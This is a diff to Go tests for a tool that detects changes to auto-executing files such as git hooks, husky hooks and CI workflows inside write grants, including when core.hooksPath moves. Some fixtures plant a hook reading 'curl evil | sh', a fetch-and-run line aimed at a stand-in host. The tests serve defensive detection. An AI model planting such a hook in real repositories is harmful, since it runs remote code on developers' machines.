@@ -37,7 +37,7 @@ func TestChangedAutoExecNamesEveryKindOfChange(t *testing.T) {
 	untouched := write("build.rs", "fn main() {}\n")
 	workflow := write(".github/workflows/ci.yml", "on: push\n")
 
-	before := snapshotAutoExec([]string{grant})
+	before := baselineAutoExec([]string{grant})
 
 	// A same-size rewrite is invisible to a size compare alone, so the edit keeps the
 	// length and moves only the mtime - the half of the stamp a test writing a longer
@@ -53,7 +53,7 @@ func TestChangedAutoExecNamesEveryKindOfChange(t *testing.T) {
 	}
 	created := write(".husky/pre-commit", "#!/bin/sh\ncurl evil | sh\n")
 
-	got := changedAutoExec(before, snapshotAutoExec([]string{grant}))
+	got := before.changed([]string{grant})
 	want := []string{created, edited, removed, workflow}
 	slices.Sort(want)
 	if !slices.Equal(got, want) {
@@ -95,12 +95,12 @@ func TestChangedAutoExecFollowsCoreHooksPath(t *testing.T) {
 	// other repo's hooks and silently report on a directory this grant never had.
 	t.Setenv("GIT_DIR", filepath.Join(elsewhere, "decoy.git"))
 
-	before := snapshotAutoExec([]string{grant})
+	before := baselineAutoExec([]string{grant})
 	planted := filepath.Join(inTree, "pre-commit")
 	if err := os.WriteFile(planted, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if got := changedAutoExec(before, snapshotAutoExec([]string{grant})); !slices.Equal(got, []string{planted}) {
+	if got := before.changed([]string{grant}); !slices.Equal(got, []string{planted}) {
 		t.Errorf("changed = %v, want %v", got, []string{planted})
 	}
 
@@ -108,11 +108,11 @@ func TestChangedAutoExecFollowsCoreHooksPath(t *testing.T) {
 	if err := os.MkdirAll(filepath.Join(elsewhere, "hooks"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	before = snapshotAutoExec([]string{grant})
+	before = baselineAutoExec([]string{grant})
 	if err := os.WriteFile(filepath.Join(elsewhere, "hooks", "pre-commit"), []byte("x\n"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if got := changedAutoExec(before, snapshotAutoExec([]string{grant})); len(got) != 0 {
+	if got := before.changed([]string{grant}); len(got) != 0 {
 		t.Errorf("a hooks dir outside every write grant is out of scope, got %v", got)
 	}
 
@@ -127,12 +127,48 @@ func TestChangedAutoExecFollowsCoreHooksPath(t *testing.T) {
 	if err := os.Symlink(filepath.Join(elsewhere, "hooks"), inTree); err != nil {
 		t.Fatal(err)
 	}
-	before = snapshotAutoExec([]string{grant})
+	before = baselineAutoExec([]string{grant})
 	if err := os.WriteFile(filepath.Join(elsewhere, "hooks", "post-commit"), []byte("x\n"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if got := changedAutoExec(before, snapshotAutoExec([]string{grant})); len(got) != 0 {
+	if got := before.changed([]string{grant}); len(got) != 0 {
 		t.Errorf("a hooks dir symlinked out of the grant is out of scope, got %v", got)
+	}
+}
+
+// A write grant with no enclosing checkout has no .git for the shields to hold down, so
+// core.hooksPath is not fixed for the run by anything the shields do: the target can git
+// init inside the grant and point it at another write grant. The baseline resolving it
+// once, before the target runs, is what keeps the after-snapshot from walking wherever the
+// run just pointed it and reporting a directory it never touched as newly created.
+func TestARunCreatedHooksPathDoesNotWidenTheReport(t *testing.T) {
+	if _, err := exec.LookPath("git"); err != nil {
+		t.Skip("git not installed")
+	}
+	grant := t.TempDir()
+	other := t.TempDir()
+	if err := os.WriteFile(filepath.Join(other, "already-here"), []byte("x\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	// No repo anywhere above the grant, which is the whole point: nothing is shielded.
+	writes := []string{grant, other}
+	before := baselineAutoExec(writes)
+
+	git := func(args ...string) {
+		t.Helper()
+		cmd := exec.Command("git", args...)
+		cmd.Dir = grant
+		cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null")
+		if out, err := cmd.CombinedOutput(); err != nil {
+			t.Fatalf("git %v: %v\n%s", args, err, out)
+		}
+	}
+	git("init", "-q")
+	git("config", "core.hooksPath", other)
+
+	if got := before.changed(writes); len(got) != 0 {
+		t.Errorf("a hooks path the RUN set must not pull another grant's contents into the report, got %v", got)
 	}
 }
 
@@ -145,11 +181,11 @@ func TestChangedAutoExecScopeIsGrantRootAndTheNamedDirs(t *testing.T) {
 	if err := os.MkdirAll(nested, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	before := snapshotAutoExec([]string{grant})
+	before := baselineAutoExec([]string{grant})
 	if err := os.WriteFile(filepath.Join(nested, "package.json"), []byte("{}"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	if got := changedAutoExec(before, snapshotAutoExec([]string{grant})); len(got) != 0 {
+	if got := before.changed([]string{grant}); len(got) != 0 {
 		t.Errorf("a nested package.json is out of scope by construction, got %v", got)
 	}
 
@@ -160,8 +196,8 @@ func TestChangedAutoExecScopeIsGrantRootAndTheNamedDirs(t *testing.T) {
 	if err := os.WriteFile(file, []byte("x"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	before = snapshotAutoExec([]string{missing, file})
-	if got := changedAutoExec(before, snapshotAutoExec([]string{missing, file})); len(got) != 0 {
+	before = baselineAutoExec([]string{missing, file})
+	if got := before.changed([]string{missing, file}); len(got) != 0 {
 		t.Errorf("an unchanged run reported %v", got)
 	}
 }
